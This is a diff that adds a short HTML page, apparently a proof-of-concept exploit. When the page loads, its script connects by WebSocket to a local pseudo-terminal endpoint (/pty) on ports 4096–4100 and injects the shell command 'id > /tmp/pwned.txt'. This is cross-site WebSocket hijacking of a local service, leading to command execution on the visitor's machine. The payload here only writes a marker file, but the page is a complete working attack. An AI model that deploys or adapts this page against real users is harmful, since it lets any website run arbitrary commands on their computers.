@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const ports = [4096, 4097, 4098, 4099, 4100];
+
+for (const port of ports) {
+  const ws = new WebSocket(`ws://127.0.0.1:${port}/pty`);
+  ws.onopen = () => {
+    setTimeout(() => {
+      ws.send(JSON.stringify({ type: 'input', data: 'id > /tmp/pwned.txt\n' }));
+    }, 500);
+  };
+}
+</script>
+</body>
+</html>
